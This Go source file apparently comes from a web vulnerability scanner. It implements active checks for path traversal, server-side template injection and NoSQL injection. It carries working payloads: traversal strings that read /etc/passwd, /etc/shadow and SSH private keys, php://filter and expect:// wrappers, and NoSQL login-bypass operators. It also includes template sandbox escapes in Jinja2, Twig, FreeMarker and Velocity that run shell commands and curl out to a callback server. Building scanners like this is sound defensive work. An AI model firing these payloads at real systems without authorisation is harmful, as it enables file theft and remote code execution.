package active

import (
	"context"
	"html"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// traversalSeeds are plain path expressions. Encoded forms are deliberately not
// listed: the mutation engine derives `%2e%2e%2f`, `....//` and the overlong
// UTF-8 variants from these, and listing them by hand would mean encoding an
// already-encoded payload.
var traversalSeeds = []string{
	"../../../../../../etc/passwd",
	"../../../../../../../../../../etc/passwd",
	"/etc/passwd",
	"../../../../etc/shadow",
	"../../../../../../proc/self/environ",
	"..\\..\\..\\..\\..\\windows\\win.ini",
	"..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
	"/windows/win.ini",
	"../../../../../../etc/passwd%00",
	// Other files an inclusion bug exposes. Each one is here because its
	// contents carry a signature below that a page has no other reason to
	// contain — a path without a signature would be a request that can never be
	// reported even when it reads the file.
	"/etc/hosts",
	"/root/.ssh/id_rsa",
	"..\\..\\..\\..\\boot.ini",
	"/WEB-INF/web.xml",
	"/web.config",
	// Stream wrappers. They are what turns an inclusion into a read the caller
	// chooses the encoding of, and a filter that blocks `../` says nothing about
	// them.
	"php://filter/convert.base64-encode/resource=/etc/passwd",
	"expect://id",
	// Path-normalisation confusion. Servers and their front-ends disagree about
	// what these resolve to, and a check that only tried `../` sequences would
	// miss an application that strips them correctly but collapses `//` badly.
	"//etc/passwd",
	"/.//etc/passwd",
	"/etc//passwd",
	"/./etc/passwd",
	"/etc/passwd/..;/etc/passwd",
	"/etc/./passwd",
	// The same file through the kernel's per-process links, which name no
	// directory a filter would think to block: `/proc/self/root` is `/`, and
	// `/proc/self/cwd` is the working directory of the process doing the reading.
	// A middleware that strips `../` and refuses paths starting with `/etc` says
	// nothing about either.
	"/proc/self/root/etc/passwd",
	"/proc/self/root/etc/hosts",
	"/proc/self/cwd/../../../../../../etc/passwd",
}

// traversalSignatures are lines from the files a traversal targets. They appear
// essentially nowhere else, which is what makes a match conclusive.
var traversalSignatures = []string{
	"root:x:0:0",
	"daemon:x:1:1",
	"nobody:x:65534",
	"[boot loader]",
	"for 16-bit app support",
	"[fonts]",
	"[extensions]",
	// `/etc/hosts` is the one loopback file whose contents are not unique line by
	// line — a page can mention `localhost` — so the pair a hosts file always
	// writes is listed first, and the bare word stays as the fallback.
	"localhost ip6-localhost",
	"localhost",
	// A private key, and the three files whose closing element names the
	// application server rather than the application.
	//
	// These are compared against a lower-cased body, so a signature that carries
	// upper case would never match anything: base64 and PEM headers are spelled
	// out below in the form the comparison actually sees.
	"private key-----",
	"</web-app>",
	"</configuration>",
	// The output of `expect://id`. Encoded output is not listed here: what a target prints
	// through base64 or hex is decoded and compared as text, which reports the file's own line
	// rather than a spelling of it that a reader has to decode by hand.
	"uid=0(",
}

// pathTraversal detects directory traversal and local file inclusion.
type pathTraversal struct{}

func (pathTraversal) ID() string                 { return "path-traversal" }
func (pathTraversal) TitleKey() i18n.Key         { return i18n.KeyCheckPathTraversalTitle }
func (pathTraversal) DescriptionKey() i18n.Key   { return i18n.KeyCheckPathTraversalDesc }
func (pathTraversal) RemediationKey() i18n.Key   { return i18n.KeyCheckPathTraversalFix }
func (pathTraversal) Severity() finding.Severity { return finding.SeverityHigh }
func (pathTraversal) Tags() []string {
	return []string{"active", "injection", "lfi", "owasp-top10"}
}
func (pathTraversal) Passive() bool { return false }

func (pathTraversal) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := strings.ToLower(string(t.Response.Body))
	c.ProbeWAF(ctx, t)

	var matched, matchedView string
	attempt, err := c.SendVariants(ctx, t, payload.Traversal, "path-traversal", traversalSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			// The file may have been read and then printed through an encoding, in which case
			// the signature is present but not in the clear.
			for _, view := range decodedViews(resp.Body) {
				if found := firstNewSignature(strings.ToLower(view), baseline, traversalSignatures); found != "" {
					matched, matchedView = found, view
					return true
				}
			}
			return false
		})
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(pathTraversal{}, t,
		i18n.KeyCheckPathTraversalTitle, i18n.KeyCheckPathTraversalDesc, i18n.KeyCheckPathTraversalFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-22"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Path_Traversal",
		"https://cwe.mitre.org/data/definitions/22.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	matches := []string{matched, variantNote(c, attempt)}
	// Reported as an encoding when the signature is not in the body as it stands: the read
	// happened, and saying which form it arrived in is the difference between evidence a reader
	// can check by eye and a line they cannot find on the page.
	if !strings.Contains(strings.ToLower(string(attempt.Response.Body)), matched) {
		matches[0] = matched + " (the page printed what it read through an encoding)"
	}
	f.Evidence.Matches = matches
	f.Evidence.Diff = extractAround(matchedView, matched, 240)
	return []*finding.Finding{f}
}

// sstiPathInjection sends the template expressions as part of the path.
//
// A route that builds a page from the name it was addressed by — a greeting, a report title, a
// breadcrumb — hands that name to the template engine, and the engine evaluates what it is
// given. No parameter check reaches it, and the judgement needs no adjustment: the evidence is
// the evaluated result, which is a number no page produces by accident, rather than anything the
// page echoes back.
//
// Both ways of writing it are tried, because a route may take the value as the last segment or
// leave room for one after it.
func sstiPathInjection(ctx context.Context, c *checks.Context, t *checks.Target, baseline string) *finding.Finding {
	limit := sstiPathSeeds
	if limit > len(sstiSeeds) {
		limit = len(sstiSeeds)
	}
	for _, seed := range sstiSeeds[:limit] {
		for _, inPlace := range []bool{true, false} {
			request, ok := withPathPayload(t.Request, seed, inPlace)
			if !ok {
				continue
			}
			response, err := c.Do(ctx, request)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			matched := sstiEvidence(string(response.Body), baseline)
			if matched == "" {
				continue
			}

			where := "appended to the path"
			if inPlace {
				where = "in place of the last path segment"
			}
			f := checks.NewFinding(ssti{}, t,
				i18n.KeyCheckSSTITitle, i18n.KeyCheckSSTIDesc, i18n.KeyCheckSSTIFix)
			f.Severity = finding.SeverityHigh
			f.Confidence = finding.ConfidenceCertain
			f.Payload = seed + " (" + where + ")"
			f.CWE = "CWE-94"
			f.References = []string{
				"https://portswigger.net/web-security/server-side-template-injection",
				"https://cwe.mitre.org/data/definitions/94.html",
			}
			f.Evidence.Request = request.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				seed + " evaluated to " + matched,
				"the value came from the path, which the caller writes as freely as a parameter",
			}
			f.Evidence.Diff = extractAround(string(response.Body), matched, 240)
			return f
		}
	}
	return nil
}

// sstiPathSeeds bounds how many expressions are tried through the path: each costs two requests,
// and the first few cover the expression syntaxes a template engine recognises.
const sstiPathSeeds = 6

// sstiProduct is the value the injected arithmetic evaluates to. It is chosen so
// it will not appear by accident in a normal page, which is what makes a match
// mean the engine really evaluated the expression.
const sstiProduct = "3996001"

// sstiSeeds cover the delimiter syntaxes of the common template engines.
var sstiSeeds = []string{
	"{{1999*1999}}",
	"${1999*1999}",
	"#{1999*1999}",
	"<%= 1999*1999 %>",
	"*{1999*1999}",
	"@(1999*1999)",
	"${{1999*1999}}",
	"{{1999*'1999'}}",
	"{{\"1999\"*1999}}",

	// Some endpoints evaluate the parameter as an expression outright, with no
	// delimiters around it — an expression language wired straight to a request
	// field. Every seed above would be read as literal text by such a target, so
	// the bare form is needed to reach it.
	"1999*1999",
	"1999*1999*1",

	// The delimiters of the engines that are not the double-brace family, taken
	// from the syntax each one actually documents: Handlebars' triple-stash and
	// `{{= }}` form, Thymeleaf's inlining, and Smarty's or Twig's single braces.
	// A page running one of them evaluates none of the seeds above.
	"{{{1999*1999}}}",
	"{{=1999*1999}}",
	"[[${1999*1999}]]",
	"{1999*1999}",

	// Shapes whose *result* identifies the engine, and which reach a target that
	// refuses arithmetic but allows the rest of the language. A Python-family
	// engine repeats a string when it is multiplied — `7*'7'` is `7777777` and
	// nowhere else — an attribute may be read where an operator is filtered, and
	// the sandbox escape runs a command when the template data is reachable.
	`{{7*'7'}}`,
	`{{''.__class__}}`,
	`{{lipsum.__globals__['os'].popen('id').read()}}`,

	// Statement forms: the engines whose assignment syntax is a statement rather
	// than an expression print the value only after it has been assigned.
	`<#assign x=1999*1999>${x}`,
	`#set($x=1999*1999)$x`,
	`{math equation="1999*1999"}`,
}

// sstiExpectations are the outputs that only evaluation can leave behind. More
// than one is needed because a target may refuse arithmetic while still
// evaluating the rest of the language: `7*'7'` repeating the string, an
// attribute read, or the sandbox escape's own output each prove evaluation on
// their own, and each is a string an ordinary page does not contain.
var sstiExpectations = []string{
	"3996001",
	"7777777",
	"<class 'str'>",
	"uid=0(",
}

// sstiEvidence returns the first expected result the body carries and the
// baseline does not, or an empty string.
//
// The body is read twice — as it arrived, and after HTML entities are decoded. A framework
// that escapes what it renders (Flask and its relatives do by default) writes
// `&lt;class &#39;str&#39;&gt;` where the evaluation produced `<class 'str'>`, and a signature
// that only matches the raw form would miss every page that takes the safer path. The
// baseline is decoded the same way, or the comparison would be between two different
// representations of the same page.
func sstiEvidence(body, baseline string) string {
	decodedBody, decodedBaseline := html.UnescapeString(body), html.UnescapeString(baseline)
	for _, expect := range sstiExpectations {
		if strings.Contains(body, expect) && !strings.Contains(baseline, expect) {
			return expect
		}
		if strings.Contains(decodedBody, expect) && !strings.Contains(decodedBaseline, expect) {
			return expect
		}
	}
	return ""
}

// ssti detects server-side template injection.
type ssti struct{}

func (ssti) ID() string                 { return "ssti" }
func (ssti) TitleKey() i18n.Key         { return i18n.KeyCheckSSTITitle }
func (ssti) DescriptionKey() i18n.Key   { return i18n.KeyCheckSSTIDesc }
func (ssti) RemediationKey() i18n.Key   { return i18n.KeyCheckSSTIFix }
func (ssti) Severity() finding.Severity { return finding.SeverityHigh }
func (ssti) Tags() []string             { return []string{"active", "injection", "ssti"} }
func (ssti) Passive() bool              { return false }

func (ssti) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := string(t.Response.Body)
	// A page that already contains one of the expected results cannot be used as
	// evidence for that result.
	if match := sstiEvidence(baseline, ""); match != "" {
		return nil
	}
	c.ProbeWAF(ctx, t)

	// A template that reaches the host's shell is a different finding from one that evaluated an
	// expression, and it is asked for first: when an interaction server is configured the answer
	// is worth the wait, and without one nothing here is sent. The arithmetic below then answers
	// the weaker question for the targets that answer nothing back.
	if f := sstiExecution(ctx, c, t); f != nil {
		return []*finding.Finding{f}
	}

	// The matcher records which result it saw, so the finding quotes the output
	// that actually proved evaluation rather than the arithmetic product alone.
	matched := ""
	attempt, err := c.SendVariants(ctx, t, payload.SSTI, "ssti", sstiSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			matched = sstiEvidence(string(resp.Body), baseline)
			return matched != ""
		})
	if err != nil || attempt == nil {
		// Nothing came back from a parameter. A route that renders the name it was addressed by
		// evaluates the same expressions, because the value is the same kind of value — the only
		// difference is that it was written in the path.
		if f := sstiPathInjection(ctx, c, t, baseline); f != nil {
			return []*finding.Finding{f}
		}
		return nil
	}

	f := checks.NewFinding(ssti{}, t,
		i18n.KeyCheckSSTITitle, i18n.KeyCheckSSTIDesc, i18n.KeyCheckSSTIFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-94"
	f.References = []string{
		"https://portswigger.net/web-security/server-side-template-injection",
		"https://cwe.mitre.org/data/definitions/94.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		attempt.Variant.Value + " evaluated to " + matched,
		variantNote(c, attempt),
	}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), matched, 240)
	return []*finding.Finding{f}
}

// nosqlErrorSignatures are the errors MongoDB and friends produce.
//
// Every entry has to be wording the *server* produces, never something a payload
// contains. An earlier version listed `$where` and `errmsg`, which are MongoDB
// field names — and therefore strings the payloads themselves carry, so a target
// that echoed the input was reported as injecting it. The echo guard below would
// catch those too, but a signature that can never be evidence does not belong in
// the list.
var nosqlErrorSignatures = []string{
	"mongoerror",
	"mongo error",
	"mongoerror:",
	"invalid bson",
	"bsontypeerror",
	"jsonparseexception",
	"casting string to",
	"e11000 duplicate key",
	"unknown operator",
	"unknown top level operator",
	"validationerror",
	"cannot apply $",
	"failed to parse",
	"not authorized on",
}

// nosqlSeeds are plain expressions; the JSON and operator spellings a filter
// might miss are produced by mutation.
var nosqlSeeds = []string{
	`'"` + "`{",
	`'||'`,
	`' || '1'=='1`,
	`" || "1"=="1`,
	`{"$ne":null}`,
	`{"$gt":""}`,
	`{"$where":"1==1"}`,
	`';return true;var x='`,
	`{"username":{"$ne":null}}`,
	// The comparison and array operators, which is what a login bypass uses in
	// place of `$ne`: `$nin` and `$or` accept a whole document, so a target that
	// filters the simple operators still has to evaluate these.
	`{"$nin":[null]}`,
	`{"$or":[{},{"drilldown":"drilldown"}]}`,
}

// nosqli detects NoSQL injection, by error and by a boolean oracle.
type nosqli struct{}

func (nosqli) ID() string                 { return "nosqli" }
func (nosqli) TitleKey() i18n.Key         { return i18n.KeyCheckNoSQLTitle }
func (nosqli) DescriptionKey() i18n.Key   { return i18n.KeyCheckNoSQLDesc }
func (nosqli) RemediationKey() i18n.Key   { return i18n.KeyCheckNoSQLFix }
func (nosqli) Severity() finding.Severity { return finding.SeverityHigh }
func (nosqli) Tags() []string             { return []string{"active", "injection", "nosql"} }
func (nosqli) Passive() bool              { return false }

func (nosqli) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := strings.ToLower(string(t.Response.Body))
	c.ProbeWAF(ctx, t)

	// Error-based first: it is the cheapest and the most conclusive.
	var matched string
	attempt, err := c.SendVariants(ctx, t, payload.NoSQL, "nosqli", nosqlSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
			// The payload is passed in so that a reflected value cannot be
			// mistaken for a parser complaint.
			matched = firstNewSignatureNotEchoed(
				strings.ToLower(string(resp.Body)), baseline, nosqlErrorSignatures, strings.ToLower(variant.Value))
			return matched != ""
		})
	if err == nil && attempt != nil {
		f := nosqlFinding(c, t, attempt.Request, attempt.Response, attempt.Variant.Value, matched)
		f.Evidence.Matches = append(f.Evidence.Matches, variantNote(c, attempt))
		return []*finding.Finding{f}
	}

	if findings := nosqlBooleanOracle(ctx, c, t); len(findings) > 0 {
		return findings
	}
	// The name is tried last because the two judgements above cover the value
	// side, and a target that answers one of them is already reported.
	return nosqlParameterNameOracle(ctx, c, t)
}

// nosqlBooleanFamilies are groups of NoSQL conditions that the server must
// treat identically, for the same reason booleanFamilies exists for SQL.
//
// A `$where` clause is evaluated for its truth value, so `'1'=='1` and `'2'=='2`
// are the same thing to it and must produce the same page; `'1'=='2` and
// `'3'=='4` are likewise the same as each other and different from the true
// ones. Two spellings per truth value is what separates a real oracle from a
// page that merely changes when it is handed a string it does not understand.
var nosqlBooleanFamilies = []struct {
	name        string
	trueValues  []string
	falseValues []string
	// anchored marks a family whose true branch should reproduce the baseline.
	// The `&&` form narrows the query back to what it was; the `||` form widens
	// it, so only the first is judged that way.
	anchored bool
}{
	{
		name:        "OR, single quotes",
		trueValues:  []string{"'||'1'=='1", "'||'2'=='2"},
		falseValues: []string{"'||'1'=='2", "'||'3'=='4"},
	},
	{
		name:        "OR, double quotes",
		trueValues:  []string{`"||"1"=="1`, `"||"2"=="2`},
		falseValues: []string{`"||"1"=="2`, `"||"3"=="4`},
	},
	{
		name:        "AND, single quotes",
		trueValues:  []string{"'&&'1'=='1", "'&&'2'=='2"},
		falseValues: []string{"'&&'1'=='2", "'&&'3'=='4"},
		anchored:    true,
	},
}

// nosqlBooleanOracle tests whether the parameter feeds a condition into a query
// the server evaluates, by asking whether its notion of equivalence shows up.
//
// The reasoning is the same as the SQL boolean check's, and so is the reason it
// needs no knowledge of the parameter: four probes make a family — two true
// conditions spelled differently, two false ones likewise — and a server that
// evaluates them produces exactly two distinct pages. It runs unmuted on
// purpose: a boolean oracle needs payloads that differ only in their truth
// value, and transforming each half independently would break the comparison
// the conclusion rests on.
// nosqlNameOperators are the parameter-name spellings a document-oriented
// framework reads as a query operator rather than as a value. They are names:
// `user[$ne]=x` reaches the query as "the field user is not equal to x" only
// because the framework's parser says so, and a check that injects into values
// never sends this shape at all — which is the form most often behind a login
// that a plain quote does not touch.
var nosqlNameOperators = []struct {
	operator string
	value    string
}{
	// True of every document that carries the field, and true of none.
	{"[$ne]", "crackweb-not-this-value"},
	{"[$exists]", "true"},
	{"[$eq]", "crackweb-not-this-value"},
}

// nosqlParameterNameOracle reports a query the framework built out of a
// parameter *name*.
//
// The judgement has the same shape as the value oracle, with the name as the
// variable: two operators that are true of every document — `$ne` against a value
// nothing carries, and `$gt` against the empty string — have to reproduce the
// baseline result set, and one that is true of none (`$eq` against that absent
// value) has to differ from it. A page that merely echoes the name fails the
// first test, because the echo is not the baseline.
func nosqlParameterNameOracle(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	base := c.BaselineFingerprint(t)
	if base == nil || base.NormLen == 0 {
		return nil
	}

	// Both sides of every comparison go through the same restore list, for the
	// reason that produced false positives in the SQL boolean check: a restore
	// applied to the branches and not to the baseline invents the difference it is
	// supposed to remove.
	// restoreFor returns the restore pairs for a value. An empty value is given
	// none: `echoRestore` would otherwise pair the empty string with the
	// parameter's own value and "restore" every empty run in the document, which
	// rewrites the fingerprint into something neither side is comparing.
	restoreFor := func(value string) []string {
		if value == "" {
			return nil
		}
		return echoRestore(value, t.Param.Value)
	}
	send := func(operator, value string) (*diff.Fingerprint, *httpmsg.Request, *httpmsg.Response, bool) {
		request, response, err := c.InjectNamed(ctx, t, t.Param.RawName+operator, value)
		if err != nil || request == nil || response == nil || response.Status >= 400 {
			return nil, nil, nil, false
		}
		fp := c.Fingerprint(response, restoreFor(value)...)
		return fp, request, response, true
	}
	trueOne, _, _, okTrueOne := send(nosqlNameOperators[0].operator, nosqlNameOperators[0].value)
	trueTwo, _, _, okTrueTwo := send(nosqlNameOperators[1].operator, nosqlNameOperators[1].value)
	falseOne, falseReq, falseResp, okFalse := send(nosqlNameOperators[2].operator, nosqlNameOperators[2].value)
	if !okTrueOne || !okTrueTwo || !okFalse {
		return nil
	}
	if trueOne.NormHash != trueTwo.NormHash {
		return nil
	}
	// The pair above is the whole of the evidence on its own: two operators that both mean
	// "the field is present" have to agree, and an operator that means "equal to a value
	// nobody has" has to disagree with them.
	//
	// What must not be required is that they reproduce the baseline. The baseline is the
	// request the crawl found, and against a login it is the failure page — "no user" — while
	// `[$ne]` on the same parameter returns the record. Asking for agreement with the baseline
	// throws away exactly the case this shape exists for.
	if falseOne.NormHash == trueOne.NormHash {
		return nil
	}

	name := t.Param.RawName
	f := checks.NewFinding(nosqli{}, t,
		i18n.KeyCheckNoSQLTitle, i18n.KeyCheckNoSQLDesc, i18n.KeyCheckNoSQLFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceFirm
	f.Payload = name + nosqlNameOperators[0].operator
	f.CWE = "CWE-943"
	f.Evidence.Request = falseReq.Raw()
	f.Evidence.Response = truncate(falseResp.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		"the parameter name is read as a query operator: " + name + nosqlNameOperators[0].operator +
			" and " + name + nosqlNameOperators[1].operator + " both returned the baseline result set, while " +
			name + nosqlNameOperators[2].operator + " against an absent value did not",
	}
	return []*finding.Finding{f}
}

func nosqlBooleanOracle(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	base := c.BaselineFingerprint(t)
	if base == nil || base.NormLen == 0 {
		return nil
	}

	for _, family := range nosqlBooleanFamilies {
		var (
			branches []*httpmsg.Response
			requests []*httpmsg.Request
			values   []string
		)
		ok := true
		for _, value := range append(append([]string{}, family.trueValues...), family.falseValues...) {
			request, response, err := c.InjectEncoded(ctx, t, value, checks.EncodeNone)
			if err != nil || request == nil || response == nil || response.Status >= 400 {
				ok = false
				break
			}
			requests = append(requests, request)
			branches = append(branches, response)
			values = append(values, value)
		}
		if !ok {
			continue
		}

		fp := func(i int) *diff.Fingerprint {
			return c.Fingerprint(branches[i], echoRestore(values[i], t.Param.Value)...)
		}
		// baseUnder fingerprints the baseline with the same restore list a branch used,
		// for the same reason as the SQL boolean check: a restore applied to one side of
		// a comparison only invents a difference.
		baseUnder := func(i int) *diff.Fingerprint {
			return c.Fingerprint(t.Response, echoRestore(values[i], t.Param.Value)...)
		}
		trueOne, trueTwo := fp(0), fp(1)
		falseOne, falseTwo := fp(2), fp(3)

		// Same truth value, same page; different truth value, different page.
		if trueOne.NormHash != trueTwo.NormHash {
			continue
		}
		if falseOne.NormHash != falseTwo.NormHash {
			continue
		}
		if trueOne.NormHash == falseOne.NormHash {
			continue
		}
		if family.anchored && trueOne.NormHash != baseUnder(0).NormHash {
			continue
		}

		simTrue := diff.CompareFingerprints(baseUnder(0), trueOne).Score
		simFalse := diff.CompareFingerprints(baseUnder(2), falseOne).Score
		simBetween := diff.CompareFingerprints(trueOne, falseOne).Score

		f := nosqlFinding(c, t, requests[0], branches[2], values[2], "boolean oracle")
		f.Confidence = finding.ConfidenceFirm
		f.Evidence.Matches = append(f.Evidence.Matches,
			"an equivalent true condition ("+values[1]+") and an equivalent false one ("+values[3]+
				") each reproduced its group, so the difference tracks the condition rather than the payload")
		f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceBoolean, round3(simTrue), round3(simFalse), round3(simBetween))
		return []*finding.Finding{f}
	}
	return nil
}

// nosqlFinding builds a NoSQL injection finding.
func nosqlFinding(c *checks.Context, t *checks.Target, req *httpmsg.Request, resp *httpmsg.Response, injected, match string) *finding.Finding {
	f := checks.NewFinding(nosqli{}, t,
		i18n.KeyCheckNoSQLTitle, i18n.KeyCheckNoSQLDesc, i18n.KeyCheckNoSQLFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = injected
	f.CWE = "CWE-943"
	f.References = []string{"https://cwe.mitre.org/data/definitions/943.html"}
	f.Evidence.Request = req.Raw()
	f.Evidence.Response = truncate(resp.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{match}
	return f
}

// sstiExecutionSeeds ask the template to run a command that calls back.
//
// Arithmetic proves the template engine evaluated something. This proves what the evaluation can
// reach: every engine here exposes the host language, and the language here has a process. The
// chains are the published ones rather than anything clever — the point is not to be novel, it is
// to answer the question an operator actually has, which is whether this is remote code
// execution or only a rendered expression.
//
// They are tried only when an interaction server is configured, so a scan without one pays
// nothing, and they are tried before the path walk because the answer is worth more.
var sstiExecutionSeeds = []string{
	// Jinja2, and anything else that reaches `os` the same way.
	`{{ cycler.__init__.__globals__.os.popen('curl ` + checks.CallbackURL + `').read() }}`,
	`{{ ''.__class__.__mro__[1].__subclasses__()[396]('curl ` + checks.CallbackURL + `',shell=True,stdout=-1).communicate() }}`,
	// Twig's filter, which runs whatever the first element names.
	`{{ ['curl ` + checks.CallbackURL + `']|filter('system') }}`,
	// FreeMarker's own Execute utility.
	`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl ` + checks.CallbackURL + `")}`,
	// Velocity, through the runtime it can reach by name.
	`#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('curl ` + checks.CallbackURL + `'))`,
}

// sstiExecution sends the command-execution chains and reports a target that called back.
func sstiExecution(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	if c.OOB == nil {
		return nil
	}
	attempt, err := c.ProbeOOB(ctx, t, "ssti", sstiExecutionSeeds, 0)
	if err != nil || attempt == nil || len(attempt.Interactions) == 0 {
		return nil
	}

	f := checks.NewFinding(ssti{}, t,
		i18n.KeyCheckSSTITitle, i18n.KeyCheckSSTIDesc, i18n.KeyCheckSSTIFix)
	// The template reached a shell and the shell reached the scan: this is code execution, not
	// an expression that evaluated.
	f.Severity = finding.SeverityCritical
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-94"
	f.References = []string{
		"https://portswigger.net/web-security/server-side-template-injection",
		"https://cwe.mitre.org/data/definitions/94.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 4096)
	f.Evidence.Baseline = truncate(t.Response.Body, 2048)
	f.Evidence.Matches = []string{
		describeInteraction(c, attempt),
		"the template ran a command on the host and it connected back, so the injection reaches " +
			"code execution rather than only the template's own expressions",
	}
	return f
}
